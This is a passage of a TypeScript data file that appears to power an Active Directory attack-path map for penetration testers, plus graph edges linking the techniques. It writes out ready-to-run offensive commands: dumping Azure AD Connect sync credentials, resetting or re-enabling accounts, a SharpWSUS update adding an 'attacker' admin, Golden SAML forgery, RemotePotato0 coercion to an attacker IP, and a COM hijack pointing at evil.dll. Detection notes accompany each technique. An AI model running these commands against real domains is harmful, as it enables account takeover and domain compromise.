      { label: 'Read sync creds with AADInternals', code: r`Get-AADIntSyncCredentials`, lang: 'powershell' },
    ],
    mitre: mitre('T1003'),
    references: [
      { label: 'dirkjanm, Updating adconnectdump (a journey into DPAPI)', url: 'https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/' },
      { label: 'dirkjanm, adconnectdump (tool + technical README)', url: 'https://github.com/fox-it/adconnectdump' },
    ],
    requires: ['Local admin / SYSTEM on an Azure AD Connect server (or ADSync DB read access)'],
    opsec: 'Reading the ADSync database and DPAPI keyset is quieter than touching LSASS, but the recovered connector account then performing a DCSync raises DS-Replication (4662) events on the DC. Hosts that run directory sync are high-value and frequently better monitored.',
  },
  {
    id: 'expired-password-reset',
    label: 'Reset Expired / Must-Change Password',
    phase: 'credential-access',
    needs: 'none',
    summary: 'A spray hit flagged STATUS_PASSWORD_MUST_CHANGE is reset over SAMR into working creds.',
    description:
      "Password spraying (or a default / blank password) sometimes returns STATUS_PASSWORD_MUST_CHANGE rather than a clean success: the account is valid but its password is expired or flagged to change at next logon, so it cannot be used yet. A SAMR password change turns the dead hit into a usable domain credential. For an expired / must-change account you supply the KNOWN expired password; the change succeeds because SAMR ChangePasswordUser2 is permitted over a null-session IPC$ connection even though interactive logon is blocked. (A genuinely blank-password account is the separate case where the old value is empty.) This differs from ForceChangePassword (an extended right held over a DIFFERENT principal) and from setting a password by NT hash (which needs the current hash).",
    tools: [
      { name: 'NetExec (change-password)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'impacket changepasswd.py', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Reset a must-change account (NetExec)', code: r`nxc smb 10.0.0.1 -u user -p OldExpiredPw -M change-password -o NEWPASS='NewPass123!'`, lang: 'bash' },
      { label: 'Reset over SMB-SAMR (impacket)', code: r`changepasswd.py 'domain.local/user:OldExpiredPw@10.0.0.1' -newpass 'NewPass123!'`, lang: 'bash' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'The Hacker Recipes, Password spraying', url: 'https://www.thehacker.recipes/ad/movement/credentials/bruteforcing/spraying' },
      { label: 'n00py, Resetting an Expired Password Remotely', url: 'https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/' },
    ],
    requires: ['A spray hit returning STATUS_PASSWORD_MUST_CHANGE / password expired'],
    opsec: 'A password change writes pwdLastSet and raises Event ID 4723 (a self-service change of the account\'s own password); 4724 is the ForceChangePassword/admin-reset case (see that node), not this one. Changing a real user password is disruptive and is usually noticed by the owner.',
  },
  {
    id: 'account-state-edit',
    label: 'Account State Manipulation',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Re-enable, unlock, or reset a blocked target account so its credential becomes usable.',
    description:
      'A target principal is valid in the directory but cannot be used because its state forbids it: the account is disabled (the ACCOUNTDISABLE flag in userAccountControl), its logonHours bitmask blocks every window, or its password is flagged must-change or expired. With write rights over the object (GenericAll / GenericWrite / ForceChangePassword) you edit the offending attribute: strip the ACCOUNTDISABLE flag, restore an all-allowed logonHours mask, or reset the password. The dead account becomes a working credential. This is the write-access counterpart to resetting a spray hit flagged must-change.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'impacket changepasswd.py', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Re-enable a disabled account (strip the ACCOUNTDISABLE flag)', code: r`bloodyAD -u <opUser> -p '<opPass>' -d domain.local --host <DC> remove uac <user> -f ACCOUNTDISABLE`, lang: 'bash' },
      { label: 'Restore an all-allowed logonHours mask (lift the logon-time restriction)', code: r`bloodyAD -u <opUser> -p '<opPass>' -d domain.local --host <DC> set object <user> logonHours -v '////////////////////////////' --b64`, lang: 'bash' },
      { label: 'Force-reset the password regardless of the old one', code: r`bloodyAD -u <opUser> -p '<opPass>' -d domain.local --host <DC> set password <user> '<NewP@ss>'`, lang: 'bash' },
      { label: 'Verify the now-usable credential authenticates', code: r`netexec smb <DC> -u <user> -p '<NewP@ss>'; netexec winrm <DC> -u <user> -p '<NewP@ss>'`, lang: 'bash' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'MITRE ATT&CK, Account Manipulation (T1098)', url: 'https://attack.mitre.org/techniques/T1098/' },
      { label: 'Microsoft, userAccountControl flags (ACCOUNTDISABLE 0x2)', url: 'https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties' },
      { label: 'Microsoft, logonHours attribute', url: 'https://learn.microsoft.com/en-us/windows/win32/adschema/a-logonhours' },
      { label: 'The Hacker Recipes, ForceChangePassword', url: 'https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword' },
    ],
    requires: ['Write control over the target account (GenericAll / GenericWrite / ForceChangePassword), or its current/old password', 'SAMR / LDAP / SMB reachable to the DC'],
    opsec: 'Editing userAccountControl or logonHours and resetting a password are auditable directory changes (4738 / 4724), and re-enabling a dormant account can trip account-management alerts. Revert the attribute after use where possible.',
  },
  {
    id: 'seenabledelegation',
    label: 'SeEnableDelegationPrivilege (Configure Delegation)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Hold the right to flip delegation flags, then configure the classic delegation you abuse.',
    description:
      "The constrained- and unconstrained-delegation abuses assume the delegation is already configured. When you instead hold the rights to CONFIGURE it, you create the misconfiguration yourself. Writing the TRUSTED_FOR_DELEGATION / TrustedToAuthForDelegation UAC flags or msDS-AllowedToDelegateTo on a principal is gated by SeEnableDelegationPrivilege, which is assigned to the Administrators group on DCs by default (Domain Admins / Enterprise Admins / BUILTIN\\Administrators), so plain GenericAll/GenericWrite over a computer does NOT let you set classic (constrained/unconstrained) delegation; that ACL yields RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) instead. Once you do hold the privilege, point a controlled (or attacker-created) account at a target SPN, then run S4U2self+S4U2proxy, or capture as an unconstrained host.",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'StandIn', url: 'https://github.com/FuzzySecurity/StandIn' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Set classic constrained delegation (bloodyAD). This alone is KCD WITHOUT protocol transition (S4U2proxy pass-through); for S4U2self on an arbitrary user also set TRUSTED_TO_AUTH_FOR_DELEGATION below', code: r`bloodyAD -u user -p PASS -d domain.local --host 10.0.0.1 set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.domain.local'`, lang: 'bash' },
      { label: 'Enable protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION) so S4U2self impersonates an arbitrary user', code: r`bloodyAD -u user -p PASS -d domain.local --host 10.0.0.1 add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION`, lang: 'bash' },
      { label: 'Flag a computer TRUSTED_FOR_DELEGATION (PowerView)', code: r`Set-DomainObject -Identity 'FS01$' -XOR @{useraccountcontrol=524288}`, lang: 'powershell' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'The Hacker Recipes, Constrained delegation', url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained' },
      { label: 'Microsoft, Enable computer and user accounts to be trusted for delegation (SeEnableDelegationPrivilege)', url: 'https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/enable-computer-and-user-accounts-to-be-trusted-for-delegation' },
    ],
    requires: ['SeEnableDelegationPrivilege (assigned to the Administrators group on DCs by default: Domain Admins / Enterprise Admins / BUILTIN\\Administrators), NOT merely GenericAll/GenericWrite over the computer, which grants RBCD instead of classic KCD'],
    opsec: 'Writing UAC delegation flags or msDS-AllowedToDelegateTo is a directory change (4742) that BloodHound and delegation audits flag; TRUSTED_FOR_DELEGATION on a non-DC object is an obvious anomaly.',
  },
  {
    id: 'pg-wsus-admins',
    label: 'WSUS Administrators',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'A WSUS admin approves a malicious update; WSUS runs it as SYSTEM on its clients (incl. the DC).',
    description:
      "Membership in the WSUS Administrators group (or local admin on the WSUS server) confers full control over update creation and approval without local admin on the clients. SharpWSUS authors an update that wraps a benign Microsoft-signed binary (e.g. PsExec) with attacker arguments and approves it for a target; the Windows Update client pulls and runs it as SYSTEM. When the Domain Controller is a WSUS client, this is a direct path to SYSTEM on the DC. This is deployment-platform abuse, a sibling of SCCM application deployment, not an NTLM relay.",
    tools: [
      { name: 'SharpWSUS', url: 'https://github.com/nettitude/SharpWSUS' },
    ],
    commands: [
      { label: 'Create + approve a malicious update (SharpWSUS)', code: r`SharpWSUS.exe create /payload:"C:\PsExec64.exe" /args:"-accepteula -s cmd.exe /c net localgroup administrators attacker /add" /title:"Update"
SharpWSUS.exe approve /updateid:<guid> /computername:dc.domain.local /groupname:"Pwn"`, lang: 'cmd' },
    ],
    mitre: mitre('T1072'),
    references: [
      { label: 'SharpWSUS (tool + technique README)', url: 'https://github.com/nettitude/SharpWSUS' },
    ],
    requires: ['Membership in WSUS Administrators (or local admin on the WSUS server)'],
    opsec: 'Update creation/approval is recorded by WSUS and the payload runs as SYSTEM via wuauclt; defenders watching WSUS content or unexpected approvals will catch it.',
  },
  {
    id: 'adfs-golden-saml',
    label: 'Golden SAML (ADFS Token Forgery)',
    phase: 'persistence',
    needs: 'local-admin',
    summary: "Steal the AD FS token-signing key, then forge SAML tokens as any user to any federated app.",
    description:
      "Where the domain federates to cloud / SaaS via AD FS, the token-signing certificate plus the DKM master key (held in AD and unwrapped by the AD FS service account) sign every SAML assertion. With control of an AD FS server or its service account, ADFSDump reads the config DB and the DKM key and ADFSpoof forges a signed SAMLResponse for an arbitrary user with arbitrary claims. Like a Golden Ticket but for federation: it authenticates to any SAML SP (Microsoft 365, AWS, vSphere, etc.), bypasses MFA, and survives the impersonated user's password reset. Federation/hybrid-identity reach, beyond the on-prem domain.",
    tools: [
      { name: 'ADFSDump', url: 'https://github.com/mandiant/ADFSDump' },
      { name: 'ADFSpoof', url: 'https://github.com/mandiant/ADFSpoof' },
    ],
    commands: [
      { label: 'Dump AD FS signing material (on the AD FS host)', code: r`ADFSDump.exe`, lang: 'cmd' },
      { label: 'Forge a SAML token as a target user', code: r`python ADFSpoof.py -b EncryptedPfx.bin DKM.bin -s sts.corp.com saml2 --endpoint https://sp/saml --nameid admin@corp.com --rpidentifier urn:sp ...`, lang: 'bash' },
    ],
    mitre: mitre('T1606.002'),
    references: [
      { label: 'CyberArk, Golden SAML (original research)', url: 'https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps' },
    ],
    requires: ['Control of an AD FS server or its service account (token-signing cert + DKM key)'],
    opsec: 'Forging happens offline, so the DC sees nothing; detection is SP-side (impossible/again-issued tokens, logins without a corresponding AD FS sign-in event). Rotating the token-signing certificate twice is what actually evicts it.',
  },
  {
    id: 'remotepotato',
    label: 'RemotePotato0 (Cross-Session NTLM Coercion)',
    phase: 'credential-access',
    needs: 'shell',
    summary: 'From a low-priv session, coerce a different logged-on user’s NTLM auth via DCOM, then crack or relay it.',
    description:
      "On a multi-user host (e.g. an RDS/jump server), a low-privilege session can abuse DCOM activation to trigger the NTLM authentication of ANOTHER interactive user currently logged on. The captured NetNTLMv2 is either cracked offline or relayed cross-protocol (e.g. to LDAP) to act as that higher-privileged user. Unlike machine-account coercion (PetitPotam/PrinterBug), this targets a logged-on USER's context without their interaction. Status: the RPC->LDAP relay path was fixed in the October 2022 Windows updates (the DCOM client auth level was raised, enforcing NTLM signing), so on modern patched hosts the flagship relay is dead; it is not a CVE. The capture / offline-crack path is unaffected by signing and may still work, as does the relay against unpatched hosts.",
    tools: [
      { name: 'RemotePotato0', url: 'https://github.com/antonioCoco/RemotePotato0' },
    ],
    commands: [
      { label: 'Coerce + capture a logged-on user (module 2 = RPC capture)', code: r`RemotePotato0.exe -m 2 -s 1 -x <attacker_ip> -p 9999`, lang: 'cmd' },
      { label: 'Coerce + cross-protocol relay (module 0, with ntlmrelayx listening)', code: r`RemotePotato0.exe -m 0 -r <relay_listener_ip> -x <oxid_resolver_ip> -p 9999 -s 1`, lang: 'cmd' },
      { label: 'Crack the captured NetNTLMv2', code: r`hashcat -m 5600 captured.txt rockyou.txt`, lang: 'bash' },
    ],
    mitre: mitre('T1187'),
    references: [
      { label: 'antonioCoco, RemotePotato0', url: 'https://github.com/antonioCoco/RemotePotato0' },
      { label: 'SentinelLabs (Cocomazzi & Pierini), Relaying Potatoes (original disclosure)', url: 'https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/' },
    ],
    requires: ['A local session on a host where a more privileged user is also logged on'],
    opsec: 'Needs a privileged user logged on concurrently; the cross-session DCOM activation and the outbound auth are detectable, and the relay leg carries the usual relay signatures. On patched hosts (post-Oct-2022) the RPC->LDAP relay leg fails outright (signing enforced), so the residual value is the offline-crack path against captured NetNTLMv2.',
  },
  {
    id: 'sssd-upn-spoof',
    label: 'SSSD UPN Spoofing (NT_ENTERPRISE)',
    phase: 'lateral-movement',
    needs: 'domain-user',
    summary: 'Rewrite a victim userPrincipalName to a target, then a NT_ENTERPRISE TGT impersonates them on a Linux/SSSD host.',
    description:
      "Linux hosts joined to AD via SSSD map a Kerberos principal to a local account. With write access to a userPrincipalName (a GenericWrite / GenericAll edge), set the controlled account's userPrincipalName to the TARGET account's samAccountName (bare, no @domain suffix), which is what the NT_ENTERPRISE search resolves first, then request a TGT for an NT_ENTERPRISE-typed principal: with the localauth plugin bypassed or unconfigured, SSSD falls back to name-based (an2ln) mapping and resolves the enterprise-principal ticket to the target local account by the spoofed UPN, logging you in as that user on the domain-joined Linux box. A mixed-vendor Kerberos-stack flaw (CVE-2025-11561), distinct from the AD CS UPN-mapping ESCs (no certificate involved).",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'impacket getTGT', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Set the victim UPN to the target (bloodyAD)', code: r`bloodyAD -u user -p PASS -d corp.local --host dc set object 'controlled-user' userPrincipalName -v 'taylor.b.adm'`, lang: 'bash' },
      { label: 'Request an enterprise-principal TGT, then SSH', code: r`getTGT.py -dc-ip 10.0.0.1 -principalType NT_ENTERPRISE 'corp.local/controlled-user:PASS'  # NT_ENTERPRISE hint makes SSSD resolve the UPN to the target`, lang: 'bash' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'Pen Test Partners, Abusing mixed-vendor Kerberos stacks', url: 'https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/' },
      { label: 'NVD, CVE-2025-11561 (SSSD Kerberos localauth advisory)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-11561' },
    ],
    requires: ['GenericWrite / GenericAll over a principal’s userPrincipalName', 'A domain-joined Linux host running SSSD'],
    opsec: 'The userPrincipalName write is a directory change (5136) and an obvious anomaly (a service/user UPN suddenly matching an admin); the impersonated logon appears on the Linux host.',
  },
  {
    id: 'com-hijack',
    label: 'COM/CLSID Handler Hijack',
    phase: 'lateral-movement',
    needs: 'shell',
    summary: 'Repoint a writable COM CLSID at your DLL so the next process to load it runs your code.',
    description:
      "Windows resolves a COM CLSID from HKCU\\Software\\Classes before HKLM, and each process reads its OWN user's hive. Repoint a CLSID's InProcServer32 / handler at your DLL and the next process that loads that object (a shell-extension or context-menu handler firing in Explorer, say) runs your code. Writing a CLSID in your own HKCU therefore executes as YOU, so this is primarily self-execution or user-level persistence. Cross-user execution is harder and needs one of: write into the victim's HKCU hive (their hive loaded, i.e. SYSTEM or their token), or an over-permissive machine-wide HKLM/HKCR CLSID that they load. From medium integrity you cannot write HKLM, which caps the reach. Distinct from the same trick used purely for reboot persistence.",
    tools: [
      { name: 'BloodHound (CLSID/registry ACLs)', url: 'https://github.com/SpecterOps/BloodHound' },
      { name: 'Native: reg.exe / regedit', url: 'https://learn.microsoft.com/windows-server/administration/windows-commands/reg' },
    ],
    commands: [
      { label: 'Repoint a CLSID handler in your own hive (same-user, no admin)', code: r`reg add "HKCU\Software\Classes\CLSID\{<guid>}\InProcServer32" /ve /t REG_SZ /d "C:\evil.dll" /f`, lang: 'cmd' },
    ],
    mitre: mitre('T1546.015'),
    references: [
      { label: 'MITRE ATT&CK, Component Object Model Hijacking', url: 'https://attack.mitre.org/techniques/T1546/015/' },
      { label: 'G DATA SecurityLabs, COM Object hijacking: the discreet way of persistence (original disclosure)', url: 'https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence' },
    ],
    requires: ['Write access to a COM CLSID registration (your own HKCU hive, the victim’s loaded hive, or an over-permissive HKLM/HKCR CLSID)'],
    opsec: 'Registry writes to CLSID/InProcServer32 keys and an unexpected DLL load are classic EDR triggers; the hijacked handler fires only when a process next resolves that CLSID.',
  },
];

// NOTE: hub -> technique edges (network-recon/valid-domain-creds/find-privesc-path)
// are routed through category nodes in ad-categories.ts. The edges below are the
// cross-links and downstream chains between techniques.
export const adAdditionEdges: AttackEdge[] = [
  { source: 'username-enum-kerbrute', target: 'password-spraying', description: 'Indicators this path applies: A user/account list is in hand (LDAP/RPC/RID-cycling/Kerberos enum) plus one or a few candidate passwords; A single password was cracked, leaked in config/source, or reused on another service and you want to test reuse domain-wide; NetExec/CrackMapExec returns [+] DOMAIN\\\\user:pass on one principal while most return [-] STATUS_LOGON_FAILURE.' },
  { source: 'rid-cycling', target: 'password-spraying' },
  { source: 'anon-ldap-dump', target: 'password-spraying' },
  { source: 'rpc-null-enum', target: 'password-spraying' },
  { source: 'smtp-user-enum', target: 'password-spraying' },
  { source: 'smtp-user-enum', target: 'online-brute', label: 'guess passwords for the user list' },
  { source: 'username-enum-kerbrute', target: 'asrep-roasting' },
  // A no-cred username list (RID cycling / anonymous LDAP) feeds AS-REP roasting too,
  // not just spraying: roast any returned account that lacks Kerberos pre-auth.
  { source: 'rid-cycling', target: 'asrep-roasting' },
  { source: 'anon-ldap-dump', target: 'asrep-roasting' },
  { source: 'rpc-null-enum', target: 'asrep-roasting' },
  { source: 'password-spraying', target: 'valid-domain-creds', label: 'valid account' },
  // A spray hit can return STATUS_PASSWORD_MUST_CHANGE: reset it over SAMR into working creds.
  { source: 'password-spraying', target: 'expired-password-reset', label: 'must-change hit' },
  { source: 'expired-password-reset', target: 'valid-domain-creds', label: 'reset to working creds' },
  { source: 'account-state-edit', target: 'valid-domain-creds', label: 'state fixed → working creds' },
  { source: 'mitm6-relay', target: 'ntlm-relay' },
  { source: 'coerced-auth', target: 'ntlm-relay' },
  { source: 'coerced-auth', target: 'adcs-esc8' },
  { source: 'coerced-auth', target: 'unconstrained-delegation' },
  { source: 'adcs-esc8', target: 'pass-the-certificate', label: 'DC machine cert' },
  // Object-first ACL abuse: each object category fans out to the abuses that apply to
  // that object type. GenericAll/GenericWrite reach these via the object cats (edges in
  // ad-categories.ts); the Control-Granting cat and ad-cat-dacl also feed the object cats.
  { source: 'acl-tgt-user', target: 'shadow-credentials', description: 'Indicators this path applies: msDS-KeyCredentialLink is writable on the target principal; a GenericWrite/GenericAll/WriteOwner/WriteDACL ACE over the target user or computer (BloodHound); at least one Windows Server 2016+ domain controller holding a Domain Controller Authentication certificate (PKINIT-capable KDC).' },
  { source: 'acl-tgt-user', target: 'targeted-kerberoast', label: 'write SPN' },
  { source: 'acl-tgt-user', target: 'targeted-asrep', label: 'flip DONT_REQ_PREAUTH' },
  { source: 'acl-tgt-user', target: 'acl-forcechangepassword', label: 'reset password' },
  { source: 'acl-tgt-user', target: 'logon-script-abuse', description: 'Indicators this path applies: WriteProperty/GenericWrite over a user\'s Script-Path attribute (PowerView Find-InterestingDomainAcl / BloodHound); writable file or directory under \\\\<domain>\\SYSVOL\\<domain>\\scripts (NETLOGON); existing logon script referenced by a user\'s scriptPath (login.vbs, *.bat, *.ps1).' },
  { source: 'acl-tgt-user', target: 'account-state-edit', description: 'Indicators this path applies: a credential is confirmed valid by smbclient/nxc but logon is refused for a state reason (not STATUS_LOGON_FAILURE); STATUS_ACCOUNT_DISABLED or the ACCOUNTDISABLE (0x2) bit set in userAccountControl; an all-zero logonHours bitmask (denies every hour, STATUS_INVALID_LOGON_HOURS); STATUS_PASSWORD_MUST_CHANGE / STATUS_PASSWORD_EXPIRED on otherwise-valid creds.' },
  { source: 'acl-tgt-user', target: 'sssd-upn-spoof', label: 'write victim UPN' },
  { source: 'acl-tgt-computer', target: 'acl-addallowedtoact' },
  { source: 'acl-tgt-computer', target: 'shadow-credentials' },
  { source: 'acl-tgt-computer', target: 'laps-read', label: 'read LAPS' },
  { source: 'acl-tgt-computer', target: 'gmsa-read', label: 'read gMSA' },
  { source: 'acl-tgt-group', target: 'acl-addself-group', description: 'Indicators this path applies: BloodHound edge AddMember / GenericWrite / GenericAll / WriteDacl from owned principal to a group; group ACE granting WriteProperty on member / Self (Add/Remove self as member); membership of target group confers a further ACL (GenericWrite/WriteDacl) over downstream users or the domain.' },
  { source: 'acl-tgt-group', target: 'acl-group-delegated' },
  { source: 'acl-tgt-policy', target: 'gpo-abuse' },
  { source: 'acl-tgt-policy', target: 'acl-gplink-ou' },
  { source: 'acl-tgt-policy', target: 'acl-dcsync-rights' },
  { source: 'acl-addallowedtoact', target: 'rbcd' },
  { source: 'acl-dcsync-rights', target: 'dcsync', label: 'replicate as non-DA', description: 'Indicators this path applies: the principal holds DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain object (a BloodHound DCSync edge); membership of Domain Admins, Administrators, or another group with replication rights; a DRSUAPI DRSGetNCChanges call to the DC succeeds over RPC.' },
  // Azure AD Connect: local admin on a directory-sync server → decrypt the connector
  // account, which (with PHS) holds DS-Replication rights → DCSync.
  { source: 'ad-cat-host-dump', target: 'azure-adconnect-sync', description: 'Indicators this path applies: ADSync service / Microsoft Azure AD Sync installed; LocalDB instance.\\\\ADSync or SQL DB named ADSync present; C:\\\\Program Files\\\\Microsoft Azure AD Sync\\\\ directory and mcrypt.dll on disk.' },
  { source: 'azure-adconnect-sync', target: 'dcsync', label: 'sync acct replication rights' },
  { source: 'azure-adconnect-sync', target: 'valid-domain-creds', label: 'Entra sync account' },
  { source: 'acl-writedacl', target: 'acl-dcsync-rights', label: 'grant yourself replication' },
  // Effective rights flow through GROUP membership, not just your user object. A delegated
  // group can itself hold GenericWrite/GenericAll/ForceChangePassword over downstream objects.
  { source: 'acl-group-delegated', target: 'acl-forcechangepassword', label: 'group can reset users' },
  { source: 'acl-group-delegated', target: 'acl-genericwrite', label: 'group can write attrs' },
  { source: 'acl-group-delegated', target: 'acl-genericall', label: 'group has full control' },
  // AddMember adds you to ANY group: Domain Admins, or another built-in priv group.
  { source: 'acl-addself-group', target: 'domain-admin', label: 'add to DA' },
  { source: 'acl-addself-group', target: 'ad-cat-priv-groups', label: 'add to a priv group' },
  { source: 'acl-forcechangepassword', target: 'valid-domain-creds', label: 'login as the user' },
  { source: 'shadow-credentials', target: 'valid-domain-creds', label: 'NT hash / TGT' },
  { source: 'targeted-kerberoast', target: 'crack-hash-offline' },
  { source: 'constrained-delegation', target: 'pass-the-ticket' },
  { source: 'rbcd', target: 'pass-the-ticket' },
  { source: 'dump-lsass', target: 'overpass-the-hash' },
  { source: 'sam-lsa-dump', target: 'overpass-the-hash' },
  { source: 'sam-lsa-dump', target: 'pass-the-hash', label: 'local NT hashes' },
  { source: 'sam-lsa-dump', target: 'mscache-crack', label: 'crack cached DCC2' },
  { source: 'pass-the-hash', target: 'overpass-the-hash' },
  { source: 'overpass-the-hash', target: 'pass-the-ticket' },
  { source: 'service-account-creds', target: 'silver-ticket', description: 'Indicators this path applies: you possess a service or machine account NT/RC4 hash or AES key; the target service exposes a Kerberos SPN (MSSQLSvc/, cifs/, http/, host/); the domain SID and the target host FQDN are known; NTLM is restricted so pass-the-hash is blocked but Kerberos works.' },
  // (kerberoasting -> silver-ticket removed: must crack first. The path
  //  kerberoasting -> crack-hash-offline -> service-account-creds -> silver-ticket covers it.)
  { source: 'silver-ticket', target: 'local-admin-host', label: 'scoped service / host', rel: 'host-exec' },
  { source: 'krbtgt-hash', target: 'pass-the-ticket', label: 'golden TGT' },
  { source: 'pass-the-ticket', target: 'lateral-movement-cme' },
  // Remote Execution: group the transports by mechanism so the lane reads in chunks of
  // 2-3 rather than one 10-wide fan. All transports still converge on lat-host-foothold.
  { source: 'lateral-movement-cme', target: 'lat-cat-smb' },
  { source: 'lateral-movement-cme', target: 'lat-cat-wmidcom' },
  { source: 'lateral-movement-cme', target: 'lat-cat-logon' },
  { source: 'lateral-movement-cme', target: 'lat-cat-shell' },
  { source: 'lat-cat-smb', target: 'psexec' },
  { source: 'lat-cat-smb', target: 'smbexec' },
  { source: 'lat-cat-smb', target: 'atexec' },
  { source: 'lat-cat-wmidcom', target: 'wmiexec' },
  { source: 'lat-cat-wmidcom', target: 'dcom-exec' },
  { source: 'lat-cat-logon', target: 'winrm-evil', description: 'Indicators this path applies: TCP 5985 (HTTP) or 5986 (HTTPS) open / WSMan listener; nxc/crackmapexec winrm returns (Pwn3d!) for the principal; Target user is a member of Remote Management Users (or local Administrators).' },
  { source: 'lat-cat-logon', target: 'rdp-lateral' },
  { source: 'lat-cat-logon', target: 'ssh-lateral' },
  { source: 'lat-cat-shell', target: 'reverse-shell' },
  // The lateral-exec transports all land you on the TARGET host, so they CONVERGE on one
  // "Foothold on the Target Host" milestone instead of each drawing its own copy of the
  // shared Admin/Root hub. SMB/WMI/DCOM service-exec require local admin → SYSTEM.
  { source: 'psexec', target: 'lat-host-foothold', label: 'SYSTEM', rel: 'host-exec' },
  { source: 'smbexec', target: 'lat-host-foothold', label: 'SYSTEM', rel: 'host-exec' },
  { source: 'atexec', target: 'lat-host-foothold', label: 'SYSTEM', rel: 'host-exec' },
  { source: 'wmiexec', target: 'lat-host-foothold', label: 'code exec', rel: 'host-exec' },
  { source: 'dcom-exec', target: 'lat-host-foothold', label: 'code exec', rel: 'host-exec' },
  // WinRM / RDP only need a remote-access GROUP (RMU / RDU), so the privilege you land with
  // depends on the account: admin if it is privileged (→ the foothold milestone), otherwise
  // a plain user session routed through the user-context foothold to escalate from.
  { source: 'winrm-evil', target: 'lat-host-foothold', label: 'if admin', rel: 'host-exec' },
  { source: 'winrm-evil', target: 'user-foothold', label: 'user shell', rel: 'host-exec' },
  { source: 'rdp-lateral', target: 'lat-host-foothold', label: 'if admin', rel: 'host-exec' },
  { source: 'rdp-lateral', target: 'user-foothold', label: 'desktop session', rel: 'host-exec' },
  // SSH lands a session as the authenticating user: root login if that account is root,
  // otherwise a user session you escalate locally (mirrors the valid-local-creds chain).
  { source: 'ssh-lateral', target: 'lat-host-foothold', label: 'root login', rel: 'host-exec' },
  { source: 'ssh-lateral', target: 'user-foothold', label: 'user session' },
  { source: 'linux-local-privesc', target: 'local-admin-host', label: 'root' },
  { source: 'reverse-shell', target: 'lat-host-foothold', label: 'if SYSTEM/admin', rel: 'host-exec' },
  { source: 'reverse-shell', target: 'user-foothold', label: 'interactive shell', rel: 'host-exec' },
  // The converged foothold milestone leads to the shared Admin/Root on Host hub.
  { source: 'lat-host-foothold', target: 'local-admin-host', rel: 'host-exec' },
  // A user-context shell → escalate locally to admin, OR just act as that user.
  { source: 'user-foothold', target: 'windows-local-privesc', label: 'escalate to admin' },
  { source: 'user-foothold', target: 'linux-local-privesc', label: 'escalate (Linux)' },
  { source: 'user-foothold', target: 'valid-domain-creds', label: 'act as the user' },
  // zerologon now lives in the 'Quick Compromise' category (off network-recon).
  { source: 'zerologon', target: 'dcsync', label: 'reset DC account' },
  { source: 'nopac', target: 'dcsync', label: 'as the DC, replicate' },
  { source: 'nopac', target: 'domain-admin', label: 'impersonate Administrator' },
  { source: 'laps-read', target: 'local-admin-host', label: 'local admin pw', rel: 'cred-reuse' },
  { source: 'gmsa-read', target: 'pass-the-hash', label: 'derived NT hash' },
  // Compromising a delegation-CONFIGURED identity (gMSA / service acct) lets you abuse ITS
  // own constrained delegation via S4U.
  { source: 'gmsa-read', target: 'constrained-delegation', label: 'its msDS-AllowedToDelegateTo S4U' },
  { source: 'service-account-creds', target: 'constrained-delegation', label: 'its msDS-AllowedToDelegateTo S4U' },
  // NOTE: GenericAll/GenericWrite over a computer yields RBCD (acl-tgt-computer -> acl-addallowedtoact -> rbcd), NOT
  // classic constrained delegation — writing msDS-AllowedToDelegateTo needs SeEnableDelegationPrivilege (DA-only),
  // so the classic-KCD path is routed only through the seenabledelegation node below.
  { source: 'ad-cat-delegation', target: 'seenabledelegation' },
  { source: 'seenabledelegation', target: 'constrained-delegation', label: 'configure + S4U' },
  { source: 'seenabledelegation', target: 'unconstrained-delegation', label: 'flag TRUSTED_FOR_DELEGATION' },
  // A recovered DC computer-account secret replicates directly: DC$ inherently holds DS-Replication.
  { source: 'pass-the-hash', target: 'dcsync', label: 'DC computer-acct hash → replicate' },
  { source: 'pass-the-ticket', target: 'dcsync', label: 'as DC$ (machine TGT)' },
  // WSUS Administrators group: approve a malicious update → SYSTEM on clients (incl. DC).
  { source: 'pgcat-deploy', target: 'pg-wsus-admins' },
  { source: 'pg-wsus-admins', target: 'local-admin-host', label: 'malicious update → SYSTEM' },
  // Golden SAML: steal the AD FS token-signing key → forge SAML tokens to federated apps.
  { source: 'persist-fed', target: 'adfs-golden-saml', description: 'Indicators this path applies: ADFS service running (adfssrv); host is a federation server; Access as the ADFS service account (gMSA or domain service account) or DKM container read rights in AD.' },
  { source: 'gmsa-read', target: 'adfs-golden-saml', label: 'AD FS svc acct → forge SAML' },
